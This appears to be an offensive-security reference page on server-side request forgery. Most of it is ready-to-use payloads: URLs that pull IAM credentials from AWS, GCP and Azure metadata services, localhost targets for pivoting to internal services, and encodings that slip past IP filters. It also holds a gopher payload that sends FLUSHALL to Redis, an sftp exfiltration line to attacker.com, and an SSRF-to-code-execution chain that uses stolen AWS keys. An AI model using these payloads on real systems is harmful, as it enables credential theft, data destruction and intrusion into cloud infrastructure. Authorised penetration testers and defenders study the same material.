---
category: technique
title: "SSRF - Server-Side Request Forgery Techniques"
tags: [ssrf, cloud-metadata, imds, aws, gcp, azure, blind-ssrf, filter-bypass, internal-network, redis, elasticsearch]
---

# SSRF

SSRF lets you make the target server issue HTTP (or other) requests on your behalf. The most dangerous consequence is cloud metadata access - in AWS, one request to the IMDS can give you credentials for the EC2 role. But even in non-cloud environments, SSRF is a foothold into internal services that aren't exposed externally.

---

## Finding SSRF entry points

Any parameter that looks like a URL, hostname, IP, or path to an external resource is a candidate:

- `url=`, `uri=`, `src=`, `href=`, `path=`, `dest=`, `redirect=`, `return=`
- `webhook_url=`, `callback=`, `notify_url=`, `ping=`
- Image embedding, PDF generators, document converters
- "Import from URL" features, RSS feed readers, thumbnail generators
- Any feature that fetches an external resource on the user's behalf

XML parsers are a separate high-signal case (XXE -> SSRF). File upload with URL-based source is another.

---

## Cloud metadata exploitation

Cloud providers run an IMDS (Instance Metadata Service) at a well-known IP that is only reachable from inside the VM. Via SSRF, you get what the instance can get.

**AWS EC2 IMDS v1 (no token required - still common):**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns the role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

**AWS EC2 IMDS v2 (requires session token - harder but still possible):**
```http
# Step 1: get a token (requires PUT with TTL header - some SSRF libs can do PUT)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: use the token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token-from-step-1>
```

**GCP Compute Engine metadata:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
```

**Azure IMDS:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Metadata: true
```

---

## Internal network pivoting via SSRF

Once you can make requests to internal IPs, pivot to services not externally exposed:

```bash
# Common internal targets worth trying
http://localhost:6379/          # Redis (try RESP protocol or HTTP-wrapped commands)
http://localhost:9200/          # Elasticsearch
http://localhost:4444/          # Metasploit
http://localhost:8080/          # Tomcat manager, internal admin
http://localhost:2375/          # Docker daemon (API)
http://localhost:10250/         # Kubernetes kubelet (pods, exec)
http://localhost:8500/          # Consul
http://localhost:8200/          # Vault
http://10.0.0.0/24              # Internal network range (scan with ffuf)

# Kubernetes service discovery via DNS
http://kubernetes.default.svc.cluster.local/api/v1/pods
```

---

## Filter bypass techniques

Most naive SSRF filters check if the URL is a private IP or blocked hostname. Bypass:

**IP encoding variants for 127.0.0.1:**
```
http://2130706433/     # decimal
http://0x7f000001/     # hex
http://017700000001/   # octal
http://127.1/          # shortened
http://[::1]/          # IPv6 loopback
http://[::]/ 
http://0.0.0.0/
```

**DNS rebinding.** Register a domain where the DNS TTL is 0. First resolution returns a non-blocked IP; second resolution (within the same request context) returns 127.0.0.1.

**URL scheme abuse.** The filter might only check `http://` and `https://`. Try:
```
file:///etc/passwd
dict://localhost:6379/COMMAND      # Redis via dict protocol
gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a   # Redis commands via gopher
sftp://attacker.com:2222/          # SFTP can exfiltrate data
```

**IPv6 SSRF:**
```
http://[::ffff:127.0.0.1]/   # IPv4-mapped IPv6
http://[::ffff:7f00:1]/      # Same, different notation
```

**Open redirect chain.** If the filter validates the initial URL but follows redirects: pass a valid-looking external URL that redirects to the internal target.

**Subdomain of a controlled domain.** Register `127.0.0.1.attacker.com` (DNS A record pointing to 127.0.0.1). Filter passes the domain check; DNS resolves to loopback.

---

## Blind SSRF detection

When the server doesn't return the response, you need out-of-band detection:

```bash
# Use Burp Collaborator or interactsh
interactsh-client   # generates unique domains, logs DNS/HTTP hits

# Or canary tokens
curl -X POST https://canarytokens.org/generate  # get a unique canary URL

# Then inject the unique URL and watch for DNS lookups
url=http://your-unique-id.interact.sh/
```

Blind SSRF can still be exploitable: trigger requests to internal services where the mere act of sending a request has a side effect (e.g., trigger a webhook that causes action, or POST to a Redis endpoint).

---

## SSRF to RCE path (AWS)

1. Find SSRF
2. Hit IMDS to get IAM credentials
3. Use credentials to call AWS APIs: list S3 buckets, describe EC2 instances
4. If role has Lambda/ECS/EC2 write permissions: deploy or modify code
5. Or: if CodeDeploy/CodePipeline is accessible: inject malicious code into a pipeline

```bash
# With stolen credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name <role-from-metadata>
```
